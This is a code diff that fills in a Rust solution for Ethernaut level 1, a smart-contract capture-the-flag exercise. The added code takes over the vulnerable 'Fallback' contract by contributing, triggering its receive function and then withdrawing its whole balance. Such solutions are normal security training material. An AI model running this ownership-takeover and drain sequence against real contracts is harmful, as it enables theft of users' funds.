@@ -15,7 +15,25 @@ impl Solution for EthernautLevel1Solution {
         challenge: &Self::Level,
         offender: Actor,
     ) -> eyre::Result<()> {
-        todo!("Solve me!")
+        let contract =
+            Fallback::new(challenge.contract_address, offender.clone());
+
+        println!("Calling contribute()...");
+        contract.contribute().value(1).send().await?.await?;
+
+        println!("Calling receive()...");
+        offender
+            .send_transaction(
+                TransactionRequest::new().to(contract.address()).value(1),
+                None,
+            )
+            .await?
+            .await?;
+
+        println!("Calling withdraw()...");
+        contract.withdraw().send().await?.await?;
+
+        Ok(())
     }
 }
 
